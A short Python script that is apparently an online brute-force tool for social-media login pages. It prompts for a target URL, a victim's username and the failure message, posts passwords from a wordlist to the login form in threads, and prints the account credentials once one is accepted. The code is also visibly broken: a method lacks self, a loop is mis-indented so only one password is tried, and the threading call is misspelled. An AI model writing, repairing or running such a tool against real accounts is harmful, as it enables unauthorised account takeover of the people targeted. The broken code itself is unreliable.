import threading
import requests
import sys
import time

class Bruteforce:
    def __init__(self, url, username, err_msg):
        """
        param:
            url : URL of target social media    
            username : username of the targetted subject
            err_msg : messege for wrong password
        return:

        """ 
        self.url = url
        self.username = username
        self.err = err_msg

        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(.02)

    def crack(self, pw):
        """
        param:
            pw : password
        """    
        data_dict = {"LoginID":self.username, "password":pw, "Log In": "submit"}
        response = requests.post(self.url, data=data_dict)
        
        if self.err in str(response.content):
            return False
        elif "CSRF" in str(response.content).upper():
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            sys.exit()
        else:
            print("Username: ---> " + self.username)
            print("Password: ---> " + pw)
            return True
 
    def crack_password(passwords, cracker):
        count = 0
        for pw in passwords:
            count += 1
        pw = pw.strip()
        print("Trying password: {} Time for => {}".format(count, pw))
        if cracker.crack(pw):
            return     

def main():
    url = input("Enter target URL : ")
    username = input("Enter target username : ")
    err_msg = input("Enter wrong password messege : ")

    cracker = Bruteforce(url, username, err_msg)

    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            pw = f.readline(chunk_size)
            if not pw:
                break
            thread = threading.thread(target=crack_password, args=(pw, cracker))
            thread.start()

if __name__ == "__main__":
    banner = "         Checking the Server !!!        [+]█████████████████████████████████████████████████[+]"
    print(banner)
    main()
